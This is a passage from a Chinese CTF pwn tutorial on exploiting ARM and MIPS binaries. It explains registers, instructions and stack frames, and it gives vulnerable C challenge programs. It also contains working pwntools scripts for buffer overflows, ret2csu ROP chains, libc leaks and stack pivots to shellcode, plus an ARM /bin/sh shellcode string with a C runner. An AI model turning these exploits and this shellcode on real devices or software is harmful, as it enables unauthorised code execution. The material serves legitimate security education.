ss-cn-beijing.aliyuncs.com/img/20211121170328.png)\n\n## 2.MIPS架构\n\n### (1)无PIE\n\n可以直接进行相应运行库加载即可，但是最好还是用gef插件。\n\n### (2)有PIE\n\npwndbg对mips架构的支持不太好，但是也由于gef关于qemu的vmmap命令不太准确，所以这里可以借助pwndbg的vmmap命令获取，如同之前的arm架构一样，获取到elf基地址之后即可查看对应的libc地址。\n\n## 项目：\n\n或者看项目，这个可以一键获取对应版本的glibc，在gdb调试中自动解析符号表和地址，方便做异构的pwn题。\n\n`mulArchAll`:https://github.com/PIG-007/mulArchAll.git\n\n\n\n\n\n# 二、ARM\n\n## 1.寄存器关系\n\n![32](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211103145318.png)\n\n- R0~R3：函数调用参数，代表第0~4个参数，剩下的参数从右向左依次入栈，函数返回值保存在R0中。(对应在aarch64中为R0~R7，但是gdb调试或者IDA中一般显示X0~X30，同时还有低32位的W0~W30)\n\n- SP：类似rsp,esp，栈指针\n\n- FP：类似ebp，栈指针\n- LR：当发生函数调用时，会保存调用函数处的地址，退出函数时赋值给PC。\n\n- PC：类似eip,rip，存储下一条指令的地址。\n\n- R11：类似ebp，栈指针，其实就差不多是FP\n\n## 2.汇编指令\n\n### (1)寄存器传送MOV\n\n寄存器之间还是MOV指令，比如MOV R2,R0;但是如果涉及到内存上的，则需要先加载到寄存器中，或者把寄存器中的值存储到内存中\n\n### (2)寄存器-内存传送\n\nSTR(store reg)/LDR(load reg)以及STM(store multiple)/LDM(load multiple)\n\n#### ①STR/LDR模式\n\n##### STR Ra [Rb]：\n\nRa中的数据存储到Rb指向的内存中\n\n##### LDR Ra [Rb]\n\nRb指向的内存中的值加载到Ra中\n\n此外还有如下情形\n\n```\nSTR  R0,[R1, #12]  // R0 --> [R1+12]\nLDR  R4,[R5, R6]  // R4 <-- [R5+R6]\n```\n\n\n\n#### ②STM/LDM模式\n\n##### STM R0, {R4,R5}\n\nR4的值传送给R0+x对应的内存单元，然后R5的值传给R0+x+x对应的内存单元\n\n这个x即由后缀决定，分别有以下几种\n\n- DB(Decrease Before)：每次传送前R0加上x，x为负数\n\n- DA(Decrease After)：每次传送后R0加上x，x为负数\n\n- IB(Increase Before)：每次传送前R0加上x，x为正数\n- IA(Increase After)：每次传送后R0加上x，x为正数\n\n而X则在不同的CPU位数下不同，32为4，64则为8。\n\n此外堆栈的增长方向可以不同，也可以在不同情形下作为后缀，效果一样的\n\n- FD(Full Descent)：满递减堆栈\n- FA(Full Ascent)：满递增堆栈\n- ED(Empty Descent)：空递减堆栈\n- EA(Empty Ascent)：空递增堆栈\n\n满则代表栈指针指向栈顶，空则代表栈指针不指向栈顶\n\n### (3)跳转指令\n\n#### ①分支跳转(Branch)\n\n##### B\n\n无条件跳转\n\n##### BX \\<Rm\\>\n\n由寄存器给出地址\n\n若 Rm 的 bit[0] 为1，切换到 Thumb 指令执行；\n\n若 Rm 的 bit[0] 为0，切换到 ARM 指令执行。\n\n##### BL\n\n类似于Call，会存入返回地址到LR寄存器\n\n##### BLX/BLR\n\n即类似对应组合\n\n#### ②条件跳转\n\n依据CPSR寄存器下的ALU状态标志位\n\nCPSR寄存器包含下面的ALU状态标志：\n\n　　N　 Set when the result of the operation was Negative(结果为负数)\n\n　　Z\tSet when the result of the operation was Zero(结果为0)\n\n　　C\tSet when the operation result in a Carry(发生进位，或借位)\n\n　　V\tSet when the operation caused oVerflow(操作造成溢出)\n\n　　Q\tARM architecture v5E only sticky flag\n\n还有BEQ、BNE\n\n\n\n## 2.非叶子函数溢出\n\n### (1)栈模型\n\n```\n#注释头\n\n+-------------+\n|             |\n|  padding    |\n+-------------+\n| \tLast FP   | \n+-------------+\n| return_addr |<- frame pointer\n+-------------+\n```\n\n先压入LR，再压入FP，当前的FP指针指向的内容为LR保存的返回地址\n\n![image-20211103144720968](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211103144726.png)\n\n### (2)题目：\n\n```C\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n\nchar bss[0x50];\n\nvoid backdoor()\n{\n    system(\"/bin/bash\");\n}\n\nvoid myFunc()\n{\n    char name[16];\n    printf(\"Please input your name:\");\n    read(0,name,0x100);\n    printf(\"Hello! \");\n    printf(name);\n}\n\nint main(int argc, char *argv[]) {\n\n    setvbuf(stdout, 0, 2, 0);\n    setvbuf(stdin, 0, 2, 0);\n    \n    system(\"echo 'PIG-007!'\");\n    puts(\"Welcome to my world!I am PIG-007!\");\n    myFunc();\n    return 0;\n\n}\n```\n\n### (3)利用：\n\n一般而言都是不存在PIE的\n\n#### A.后门\n\n```python\nbackDoor = 0x1050C\n\nfake_FP = 0xdeadbeef\npayload = \"A\"*0x10\npayload += p32(fake_FP)\npayload += p32(backDoor)\n\n#mulArchDbg()\np.sendline(payload)\n#pause()\np.interactive()\n```\n\n#### B.ROP链条\n\n##### 🔺注意：\n\n不知道为啥，在我的GDB调试时，打印出来的函数地址和真实的函数地址不一样：\n\n![image-20211104115041178](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211104115048.png)\n\n上面0x2101c是system的got表地址，可是和GDB打印的函数地址不一样，但是实际上libc.so文件没什么问题，因为可以正常getshell。之后咨询了lucky师傅之后，在室友的帮助下，编译了各个版本的arm架构下的glibc，再通过qemu加载运行库就正常了。\n\n##### 劫持栈模型：\n\n```\n+-------------+\n|             |\n|  padding    |\n+-------------+\n|  Last FP    | \n+-------------+\n|gadgets_addr | <- frame pointer(return_addr)\n+-------------+\n```\n\n##### A.溢出字节不受限制\n\n###### a.存在`pop {r0,*, pc}`\n\n当有`pop {r0,*, pc}`这种gadget，当然就是想怎么用就怎么用，但没有的时候可以用常见的CSU来替代。\n\n###### b.利用csu\n\n```\n#注释头\n\n.text:0001049C                 LDR     R3, [R5],#4                 ②\n.text:000104A0                 MOV     R2, R9\n.text:000104A4                 MOV     R1, R8\n.text:000104A8                 MOV     R0, R7\n.text:000104AC                 BLX     R3                          ③\n.text:000104B0                 CMP     R6, R4\n.text:000104B4                 BNE     loc_10498\n.text:000104B8                 LDMFD   SP!, {R4-R10,PC}            ①\n```\n\n这里就是很正常的，通过①来为R4-R10赋值，以及控制PC跳转到②，再利用R5地址对应的值来赋值给R3对应跳转，期间也可通过R7-R8来控制R0-R2的参数。这里需要满足R5处保存的是got表地址，即将R5赋值为func_got_addr即可。\n\n```python\ndef arm_csu(call,u_gadget1,u_gadget2,r0,r1,r2):\n    payload = p32(u_gadget1)\n    payload += p32(0)\n    payload += p32(call) #[r5]->r3  blx r3\n    payload += p32(0)\n    payload += p32(r0)\n    payload += p32(r1)\n    payload += p32(r2)\n    payload += p32(0)\n    payload += p32(u_gadget2)\n    return payload\n\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x54\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x38\n\nfake_FP = start_addr\npayload = \"A\"*0x10\npayload += p32(fake_FP)\npayload += arm_csu(system_got,u_gadget1,u_gadget2,binsh_addr,0,0)\npayload += p32(0)*7\npayload += p32(start_addr)\np.sendline(payload)\np.interactive()\n```\n\n\n\n这个是基于调用了system函数，所以system函数中的Got表中已经有了函数地址，同样的，当没有时需要泄露地址，通常调用puts函数或者printf函数即可泄露地址，如下相关脚本\n\n```\nfake_FP = start_addr\npayload = \"A\"*0x10\npayload += p32(fake_FP)\npayload += arm_csu(printf_got,u_gadget1,u_gadget2,printf_got,0,0)\npayload += p32(0)*7\npayload += p32(start_addr)\n#mulArchDbg()\np.sendline(payload)\nprintf_addr = u32Leakbase(0)\nlibc.address = printf_addr - libc.sym['printf']\nsystem_addr = libc.sym['system']\nbinsh_addr = libc.search('/bin/sh').next()\nlg(\"system_addr\",system_addr)\nlg(\"binsh_addr\",binsh_addr) \n```\n\n控制返回地址进入u_gadget1\n\n![image-20211105110402858](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105110403.png)\n\n然后控制R4~R10寄存器，跳转u_gadget2\n\n![image-20211105110734269](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105110734.png)\n\n然后跳转got表中函数\n\n![image-20211105110946942](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105110947.png)\n\n这里在调用CSU时也需要控制R6和R4，依据`CMP     R6, R4`，使得之后的`BNE     loc_10624`短跳转不成立，进入到csu中的最后的`POP     {R4-R10,PC}`语句，这时候再将栈控好，就能返回到start函数重新开始了。\n\n![image-20211105112027065](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105112027.png)\n\n现在的栈在我们最开始的时候已经通过以下语句控制好了，pop之后即可控制pc进入start函数重新开始。\n\n```\npayload += p32(0)*7\npayload += p32(start_addr)\n```\n\n泄露地址之后，如果程序中没有调用system，那么依然也无法通过ret2csu来getshell，但是可以通过下列的来代替：\n\n```\npop {r4, r5, r6, r7, r8, sb, sl, pc} \t#pop_R4_R10_PC\npop {r3, pc} \t\t\t\t\t\t\t#pop_r3_pc\nmov r0, r7 ; blx r3\t\t\t\t\t\t#movR0_R7_BLR3\n```\n\n而`pop_R4_R10_PC`和`movR0_R7_BLR3`都是csu中的，`pop_r3_pc`则非常常用，基本都有。\n\n这个就是先控R7，在控R3，最后R7赋给R0，跳转R3调用想调用的函数，这里就是`system('/bin/sh')`。\n\n```python\nfake_FP = start_addr\npayload = \"A\"*0x10\npayload += p32(fake_FP)\npayload += p32(pop_R4_R10_PC)\npayload += p32(0)\t\t\t\t#r4\npayload += p32(0)\t\t\t\t#r5\npayload += p32(0) \t\t\t\t#r6\npayload += p32(binsh_addr)      #r7\npayload += p32(0)\t\t\t\t#r8\npayload += p32(0)\t\t\t\t#r9\npayload += p32(0)\t\t\t\t#r10\npayload += p32(pop_r3_pc)      \t#r3\npayload += p32(system_addr)\npayload += p32(movR0_R7_BLR3)\n```\n\n这里的system函数地址就得是泄露的真实地址了，因为赋值过程是直接寄存器赋值，而不是取寄存器值为地址再取值了。\n\n这里的fake_FP基本没有什么用，但是下面介绍的就会有用了。\n\n##### B.溢出字节受到限制\n\n当溢出字节受到限制，比如只能溢出0x10个字节时。\n\n参照inctf2018-warmup题目\n\n###### a.利用read函数+shellcode\n\n当调用了read函数时，且该arm架构使用qemu模拟，那么bss段基本都是可执行的。(具体原因未知)\n\n那么调用read函数一般都是如下：\n\n```\n.text:00010540                 MOV     R2, #0x100      ; nbytes\n.text:00010544                 MOV     R1, R3          ; buf\n.text:00010548                 MOV     R0, #0          ; fd\n.text:0001054C                 BL      read\n```\n\n这里就可以通过赋值给buf的语句来劫持R1，将shellcode读取到我们想放置的位置，当然，这之前还是得劫持R3寄存器，不过这个直接通过很常用的gadget即可。\n\n```\npop {r3, pc} \t\t\t\t\t\t\t#pop_r3_pc\n```\n\n那么如下所示\n\n```python\nshellcode_addr = bss_addr + 0x4\nfake_FP = bss_addr\npayload = \"A\"*0x10\npayload += p32(fake_FP)\npayload += p32(pop_r3_pc)\npayload += p32(bss_addr)\npayload += p32(read_gadget)\n#mulArchDbg()\np.sendline(payload)\nsleep(1)\np.sendline(p32(shellcode_addr)+shellcode)\n#pause()\np.interactive()\n```\n\n![image-20211105115257258](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105115257.png)\n\n这样即可读取shellcode到bss段了\n\n![image-20211105115432342](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105115432.png)\n\n不过这也需要原本的读取函数设置的buf长度足够放下我们的shellcode才行，已经成功读取\n\n![image-20211105115637472](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105115637.png)\n\n这里的fake_FP就起作用了，因为我们劫持了FP，所以在myFunc函数，即存在溢出函数返回时，通过\n\n`SUB     SP, R11, #4`将FP减4之后赋值给SP，就能劫持栈了，\n\n![image-20211105120320963](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105120321.png)\n\n之后再通过`POP     {R11,PC}`，劫持PC，进入到shellcode执行。需要注意的是这里由于是pop给PC，所以bss段上还是需要放上对应shellcode处的地址，所以发送shellcode的语句为\n\n```python\np.sendline(p32(shellcode_addr)+shellcode)\n```\n\n最后成功getshell。\n\n#### 🔺存在PIE时\n\n这种一般都是需要结合爆破来进行了，或者题目本身泄露地址。\n\n\n\n\n\n## 3.叶子函数溢出\n\n### (1)栈模型\n\n```\n#注释头\n\n+-------------+\n|             |\n|  padding    |\n+-------------+\n|  Last FP    | <- frame pointer\n+-------------+\n```\n\n但是这样就不好利用，只能劫持到上一层函数的函数栈，那么通常会尝试劫持栈迁移一段距离，使得上一个非叶子函数的剩下的汇编代码所用到的栈上数据是我们伪造的栈中的数据，这样就能完成劫持上一个非叶子函数的返回地址。\n\n### (2)题目：\n\n```C\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n\nchar bss[0x100];\n\nvoid backdoor()\n{\n    system(\"/bin/bash\");\n}\n\nvoid myFunc(char* nameSrc,int amount,int* i)\n{\n    char name[16];\n\n    while(1)\n    {\n        name[i[0]] = nameSrc[i[0]];\n        i[0] = i[0] + 1;\n        if( i[0] == amount)\n            break;\n    }\n}\n\nint main(int argc, char *argv[]) {\n\n    int i[2] = {0,0};\n    setvbuf(stdout, 0, 2, 0);\n    setvbuf(stdin, 0, 2, 0);\n\n    system(\"echo 'PIG-007!'\");\n    puts(\"Welcome to my world!I am PIG-007!\");\n    printf(\"Please input your name:\");\n    read(0,bss,0x100);\n    printf(\"Hello! \");\n    printf(bss);\n    myFunc(bss,strlen(bss),i);\n    return 0;\n}\n```\n\n### (3)利用：\n\n直接劫持Last FP，然后利用上一层函数返回时劫持栈，在栈上保存shellcode地址，直接进入shellcode即可getshell。\n\n```python\nshellcode_addr =  bss_addr + 0x20\npayload = \"\"\npayload += \"A\"*0x14\npayload += p32(bss_addr + 0x18)\npayload += p32(bss_addr + 0x18)\npayload += p32(shellcode_addr)\npayload += shellcode\n\n#mulArchDbg()\np.sendline(payload)\n#pause()\np.interactive()\n```\n\npop {fp}之后已经劫持栈到bss段上了\n\n![image-20211106220025308](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211106220032.png)\n\n返回main函数之后，利用main函数中的返回指令`sub sp,fp,#4`完成栈劫持\n\n![image-20211106220242850](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211106220242.png)\n\n然后就利用`pop {fp, pc}`来劫持返回地址，进入到我们输入的bss段上shellcode的地方\n\n![image-20211106221534722](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211106221534.png)\n\n#### 注：\n\n不在bss段上时，我们劫持完Last FP，返回上一层函数栈中时，当溢出长度足够，可直接修改上一层函数栈中的数据，相当于就是非叶子函数的溢出了。\n\n至于溢出长度不够，只能劫持Last FP的时候，又无法泄露地址，感觉不太能搞，或者上上一层函数中有剩下可利用的数据，那么就部分劫持Last FP，利用上上一层函数中剩下的汇编来getshell，这个具体看题目。\n\n\n\n## 4.格式化字符串\n\narm架构下的格式化字符串泄露的顺序是R1,R2,R3,栈，其他的相关利用方式也是类似，不再多说。\n\n## 5.堆\n\n堆的利用方法也是类似的。\n\n\n\n\n\n参考：\n\n[ARM架构下的 Pwn 的一般解决思路 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/199112#h3-20)\n\n\n\n\n\n## Shellcode\n\n```c\n#include <stdio.h>\n#include <string.h>\n\nchar *SC =      \"\\x01\\x30\\x8f\\xe2\"\n                \"\\x13\\xff\\x2f\\xe1\"\n                \"\\x78\\x46\\x0e\\x30\"\n                \"\\x01\\x90\\x49\\x1a\"\n                \"\\x92\\x1a\\x08\\x27\"\n                \"\\xc2\\x51\\x03\\x37\"\n                \"\\x01\\xdf\\x2f\\x62\"\n                \"\\x69\\x6e\\x2f\\x2f\"\n                \"\\x73\\x68\";\n\nint main(void)\n{\n    char payload[34];\n\n    memcpy(payload, SC, 34);\n\n    fprintf(stdout, \"Length: %d\\n\", strlen(SC));\n    (*(void(*)()) payload) ();\n\nreturn 0;\n}\n```\n\n\n\n# 三、MIPS\n\n主要介绍mipsel架构的，小端序，大端的mips很少考到，而且也基本都是大同小异\n\n## 1.流水线特点\n\n以下指令的，strchr 函数的参数来自 $s0 而不是 $s2\n\n```asm\nmov $a0, $s2;\njalr strchr;\nmove $a0, $s0;\n```\n\n## 🔺注：流水线\n\n即跳转之前会先一步加载下一条指令，所以在寻找ROP时，注意看下一步指令都是什么，不然跳转过去参数或者栈帧都有可能会出错的。\n\n但是因为通常PWN题的MIPS通常是用qemu的user模式运行的，这个可能导致指令流水有时候表现不出来，所以不没有调用函数sleep(1)去将数据区刷新到指令区域也是可以拿到shell的；但是如果题目使用system模式部署，添加调用函数刷新数据区域再跳转到shellcode就很必要了，但如果是ROP来getshell倒是不用刷新数据。\n\n\n\n## 2.栈机制\n\n### 函数调用\n\n```\n.text:00409A14                 la      $t9, sobj_del\n.text:00409A18                 nop\n.text:00409A1C                 jalr    $t9 ; sobj_del\n.text:00409A20                 move    $a0, $s5\n.text:00409A24                 lw      $gp, 0x4C0+var_4B0($sp)\n```\n\n常见于库函数\n\n- 通过`$t9`来跳转\n\n- 跳转指令为`jalr`，保存返回地址到`$ra`，这里的返回地址即为\n\n  ```\n  .text:00409A24                 lw      $gp, 0x4C0+var_4B0($sp)\n  ```\n\n- 由于五级流水线，所以通常在跳转指令下一条指令加载参数，这里即为\n\n  ```\n  .text:00409A20                 move    $a0, $s5\n  ```\n\n  当然如果涉及到多个参数就会提前加载了\n\n### 函数栈加载\n\n#### 叶子函数\n\n叶子函数不需要将返回地址保存到栈上，所以一般只需要将参数放入栈中\n\n```\n//栈空间开辟\n.text:00400834                 addiu   $sp, -0x30\n//栈指针设置\n.text:00400838                 sw      $fp, 0x2C+var_s0($sp)\n.text:0040083C                 move    $fp, $sp\n//参数入栈\n.text:00400840                 sw      $a0, 0x2C+test($fp)\n```\n\n有的也会有关于`$gp`指针的设置，一般是用到了全局变量，常量什么的\n\n```\n.text:00409480                 lui     $gp, 0x43  # 'C'\n.text:00409484                 addiu   $sp, -0x4E8\n.text:00409488                 li      $gp, (_GLOBAL_OFFSET_TABLE_+0x7FF0)\n```\n\n#### 非叶子函数\n\n非叶子函数需要将返回地址保存到栈上\n\n```\n.text:00409480                 lui     $gp, 0x43  # 'C'\n//栈空间开辟\n.text:00409484                 addiu   $sp, -0x4E8\n.text:00409488                 li      $gp, (_GLOBAL_OFFSET_TABLE_+0x7FF0)\n.text:0040948C                 sw      $ra, 0x4C0+var_s24($sp)\n.text:00409490                 sw      $fp, 0x4C0+var_s20($sp)\n//返回地址$ra入栈\n```\n\n### 函数返回\n\n#### 叶子函数\n\n叶子函数直接通过`$ra`寄存器返回\n\n```\n//....一些参数加载\n.text:00409A54                 jr      $ra\n//栈空间销毁\n.text:00409A58                 addiu   $sp, 0x4E8\n```\n\n#### 非叶子函数\n\n非叶子函数需要从栈中获取返回地址到`$ra`寄存器，然后也是通过`$ra`寄存器返回\n\n```\n//一些处理工作....\n.text:0040091C                 move    $sp, $fp\n//获取栈上的返回地址\n.text:00400920                 lw      $ra, 0x28+var_s4($sp)\n.text:00400924                 lw      $fp, 0x28+var_s0($sp)\n//通过$ra返回\n.text:00400928                 jr      $ra\n//栈空间销毁\n.text:0040092C                 addiu   $sp, 0x30\n```\n\n### 总结：\n\n总的来说，和x86也是有点相似，不同的就是关于`$ra`寄存器的使用，以及叶子函数和非叶子函数的区别，还有一些五级流水线机制。\n\n## 3.寄存器关系\n\n| REGISTER | NAME      | USAGE                                                        |\n| :------- | :-------- | :----------------------------------------------------------- |\n| $0       | $zero     | 常量0(constant value 0)                                      |\n| $1       | $at       | 保留给汇编器(Reserved for assembler)                         |\n| $2-$3    | $v0 - $v1 | 函数调用返回值(values for results and expression evaluation) |\n| $4-$7    | $a0-$a3   | 函数调用参数(arguments)                                      |\n| $8-$15   | $t0-$t7   | 暂时的(或随便用的)                                           |\n| $16-$23  | $s0-$s7   | 保存的(或如果用，需要SAVE/RESTORE的)(saved)                  |\n| $24-$25  | $t8-$t9   | 暂时的(或随便用的),$t9通常会在函数调用时用到                 |\n| $28      | $gp       | 全局指针(Global Pointer),通常有全局变量、常量之类会用到      |\n| $29      | $sp       | 堆栈指针(Stack Pointer)                                      |\n| $30      | $fp       | 帧指针(Frame Pointer)                                        |\n\n说明\n\n- $0\n\n即$zero,该寄存器总是返回零，为0这个有用常数提供了一个简洁的编码形式。\n\n```mipsasm\nmove $t0,$t1\n#实际为  \nadd $t0,$0,$t1\n```\n\n使用伪指令可以简化任务，汇编程序提供了比硬件更丰富的指令集。\n\n- $1\n\n即 $at，该寄存器为汇编保留，由于I型指令的立即数字段只有16位，在加载大常数时，编译器或汇编程序需要把大常数拆开，然后重新组合到寄存器里。比如加载一个32位立即数需要 `lui`（装入高位立即数）和`addi`两条指令。像MIPS程序拆散和重装大常数由汇编程序来完成，汇编程序必需一个临时寄存器来重组大常数，这也是为汇编保留$at的原因之一。\n\n- $2..$3:($v0-$v1)\n\n用于子程序的非浮点结果或返回值，对于子程序如何传递参数及如何返回，MIPS范围有一套约定，堆栈中少数几个位置处的内容装入CPU寄存器，其相应内存位置保留未做定义，当这两个寄存器不够存放返回值时，编译器通过内存来完成。\n\n- $4..$7:($a0-$a3)\n\n用来传递前四个参数给子程序，不够的用堆栈。a0-a3和v0-v1以及ra一起来支持子程序／过程调用，分别用以传递参数，返回结果和存放返回地址。当需要使用更多的寄存器时，就需要堆栈（stack)了,MIPS编译器总是为参数在堆栈中留有空间以防有参数需要存储。\n\n- $8..$15:($t0-$t7)\n\n临时寄存器，子程序可以使用它们而不用保留。\n\n- $16..$23:($s0-$s7)\n\n保存寄存器，在过程调用过程中需要保留（被调用者保存和恢复，还包括$fp和$ra），MIPS提供了临时寄存器和保存寄存器，这样就减少了寄存器溢出（spilling,即将不常用的变量放到存储器的过程),编译器在编译一个叶（leaf)过程（不调用其它过程的过程）的时候，总是在临时寄存器分配完了才使用需要保存的寄存器。\n\n- $24..$25:($t8-$t9)\n\n同($t0-$t7) $26..$27:($k0,$k1)为操作系统／异常处理保留，至少要预留一个。 异常（或中断）是一种不需要在程序中显示调用的过程。MIPS有个叫异常程序计数器（exception program counter,EPC)的寄存器，属于CP0寄存器，用于保存造成异常的那条指令的地址。查看控制寄存器的唯一方法是把它复制到通用寄存器里，指令`mfc0`(move from system control)可以将EPC中的地址复制到某个通用寄存器中，通过跳转语句（`jr`)，程序可以返回到造成异常的那条指令处继续执行。MIPS程序员都必须保留两个寄存器$k0和$k1，供操作系统使用。\n发生异常时，这两个寄存器的值不会被恢复，编译器也不使用k0和k1,异常处理函数可以将返回地址放到这两个中的任何一个，然后使用jr跳转到造成异常的指令处继续执行。\n\n- $28:($gp)\n\n为了简化静态数据的访问，MIPS软件保留了一个寄存器：全局指针gp(global pointer,$gp)，全局指针指向静态数据区中的运行时决定的地址，在存取位于gp值上下32KB范围内的数据时，只需要一条以gp为基指针的指令即可。在编译时，数据须在以gp为基指针的64KB范围内。\n\n- $29:($sp)\n\nMIPS硬件并不直接支持堆栈，你可以把它用于别的目的，但为了使用别人的程序或让别人使用你的程序，还是要遵守这个约定的，但这和硬件没有关系。\n\n- $30:($fp)\n\nGNU MIPS C编译器使用了帧指针(frame pointer),而SGI的C编译器没有使用，而把这个寄存器当作保存寄存器使用（$s8),这节省了调用和返回开销，但增加了代码生成的复杂性。\n\n- $31:($ra)\n\n存放返回地址，MIPS有个`jal`(jump-and-link,跳转并 链接)指令，在跳转到某个地址时，把下一条指令的地址放到$ra中。用于支持子程序，例如调用程序把参数放到$a0~$a3,然后`jal X`跳到X过程，被调过程完成后把结果放到$v0,$v1,然后使用`jr $ra`返回。\n\n\n\n## 4.指令\n\n### (1)不同类型的指令\n\n#### R型指令：操作寄存器\n\n常见指令：`add`, `sub`, `and`, `or`, `nor`, `slt`, `sll`, `srl`, `jr`\n\n![image-20211230150231733](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20211230150231733.png)\n\n- opcod：操作码 \n- rs：源寄存器的数量 \n- rt：源寄存器的数量 \n- rd：目标寄存器的编号\n- sham：移位量（操作移位的位数）\n- Func: 函数（操作码扩展） \n\nSham仅用于操作偏移量的指令（例如`stl`）\n\n#### I型指令：操作常量\n\n常见指令：`addi`, `lw`, `sw`, `lh`, `sh`, `lb`, `lbu`, `sb`, `ll`, `sc`, `lui`, `andi`, `ori`, `beq`, `bne`, `slti`, `sltiu`\n\n![img](https://dev.azure.com/zslyvain/9285f0e6-8055-4a5c-aec3-50d9555ac078/_apis/git/repositories/4eb461c6-bb1f-489f-978b-686e8c32decf/items?path=%2F1625856577691_8905.png&versionDescriptor[versionOptions]=0&versionDescriptor[versionType]=0&versionDescriptor[version]=master&resolveLfs=true&%24format=octetStream&api-version=5.0)\n\n- opcod：操作码\n- rs：源寄存器的数量\n- rd：源或目标寄存器的数量\n- imd: 立即值\n\n\n\n#### J型指令：跳跃寻址\n\n处理器直接跳跃到给定的地址，执行所在地址的指令\n\n常见指令：`j`, `jal`\n\n![image-20211230150255746](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20211230150255746.png)\n\n- Opcod：操作码\n- Imd：立即值\n\n\n\n### (2)常用指令\n\n其中`i`表示立即数相关，`u`表示无符号相关。\n\n#### ①load/store 指令\n\n- la：将地址或者标签存入一个寄存器 eg:`la $t0,val_1`复制val_l的地址到$t0中，val_1是一个Label\n\n- li：将立即数存入通用寄存器 eg:`li $t1, 40` $t1 = 40\n\n- lw：从指定的地址加载一个word类型的值到一个寄存器 eg:`lw $s0, 0($sp) $s0=MEM[$sp+0]`\n\n- sw：将寄存器的值，存于指定的地址word类型 eg:`sw $a0, 0($sp) MEM[$sp+0] = $a0`\n\n- move：寄存器传值 eg：`move $t5, $t2 $t5 = $t2`\n\n#### ②算数指令\n\n算数指令的所有操作都是寄存器，不能是 RAM 地址或间接寻址。且操作数大小都是 word（4byte）\n\n```asm\nadd $t0, $t1, $t2;\t\t$t0=$t1+$t2;\t带符号数相加\nsub $t0, $t1, $t2;\t\t$t0=$t1-$t2;\t带符号数相减\naddi $t0, $t1, 5;\t\t$t0=$t1+5;\t\t有立即数的加法\naddu $t0, $t1, $t2;\t\t$t0=$t1+$t2;\t无符号数的加法\nsubu $t0, $t1, $t2;\t\t$t0=$t1-$t2;\t带符号数相减\nmult $t3, $t3;\t\t\t(HI, LO) = $t3 * $t4\ndiv $t5, $t6;\t\t\t$Hi=$t5 mod $t6\nmfhi $t0;\t\t\t\t$t0 = $Hi\nmflo $t1;\t\t\t\t$t1 = $Lo\n```\n\n#### ③syscall\n\n产生一个软化中断，实现系统调用；系统调用号存放在 $v0 中，参数在 $a0~$a3 中；\n\n返回值在 $v0 中，如果出错，在 $a3 中返回错误号；在编写 shellcode 时，用到该指令机制\n\nWrite(1, “ABCn”, 5) 实现如下\n\n```asm\naddiu $sp, $sp, -32;\nli $a0, 1;\nlui $t6, 0x4142;\nori $t6, $t6, 0x430a;\nsw  $t6, $0($sp);\naddiu $a1, $sp, 0;\nli $a2, 5;\nli $v0, 4004;\nsyscall;\n```\n\n#### ④分支跳转指令\n\n分支跳转指令本身可以通过比较两个寄存器决定如何跳转；如果想要实现与立即数的比较跳转，需要结合类跳转指令实现\n\n```asm\nb target;\t\t\t\t无条件跳转到target处\nbeq $t0, $t1, target;\t如果\"$t0 == $t1”，跳转到target\nblt $t0, $t1, target;\t如果“$t0 < $t1”，跳转到target\nble $t0, $t1, target;\t如果“$t0 <= $t1” 跳转到target\nbgt;\nblt;\nbne;\t\t\t\t\t类比上\n```\n\n#### ⑤跳转指令\n\n```asm\nj target;\t\t\t无条件跳转target\njr $t3;\t\t\t\t跳转到$t3指向的地址处(Jump Register),没有保存地址,一般是函数返回时候用到的\njal target;\t\t\t跳转到target，并保存返回地址到$ra中，常见于函数调用\n```\n\n#### ⑥子函数的调用\n\n```asm\njal   sub_routine_label;复制返回地址到$ra中,即当前PC+8的值，程序跳转到sub_routine_label\n```\n\n#### ⑦子函数的返回\n\n```asm\njr    $ra;如果子函数重复嵌套，则将$ra的值保存在堆栈中，因为$ra总是保存当前执行的子函数的返回地址\n```\n\n\n\n以上大多参考如下\n\n[MIPS汇编语言入门 - Sylvain's Blog (valeeraz.github.io)](https://valeeraz.github.io/2020/05/08/architecture-mips/)\n\n[2021第四届强网拟态防御积分赛工控pwn eserver WP - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/259594)\n\n\n\n\n\n\n\n## 5.常用ROP寻址\n\nIDA中\n\n```python\n#mipsrop\nimport mipsrop\nmipsrop=mipsrop.MIPSROPFinder()\nmipsrop.find(\"\")\nmipsrop.stackfinder() #寻找栈数据可控的 rop，建立和 a0、a1 寄存器的关系\nmipsrop.summary() #列出所有的可用 rop\nmipsrop.system() #寻找命令执行的的rop\nmipsrop.find('jr $ra')\nmipsrop.find(\"move $t9, $s3\")\nmipsrop.find(\"addiu $a1,$sp\")\n```\n\n很多好用ROP的可在libc的scandir_tail类别函数下可以找到\n\n### `Shellcode`三部曲\n\n#### (1)gadget1\n\n从sp控制寄存器\n\n```\nlw ra,0x3c(sp);\nlw s3,0x2c(sp);\nlw s2,0x28(sp);\nlw s1,0x24(sp);\nlw s0,0x20(sp);\n```\n\n这个通常可以在`scandir_tail`函数中找，或者如下\n\n```python\nmipsrop.find('jr $ra')\n```\n\n#### (2)gadget2\n\n从栈取地址给寄存器，然后跳转之前控制住的寄存器\n\n```\naddiu a1,0x18(sp);move t9,s3;jalr t9\n```\n\naddiu指令即是取栈地址到a1寄存器，方便之后跳转，如下寻找指令\n\n```python\nmipsrop.find(\"addiu $a1,$sp\")\n```\n\n#### (3)gadget3\n\n跳转保存栈地址的寄存器，进入`shellcode`\n\n```\nmove t9,a1;move a1,a2;jr 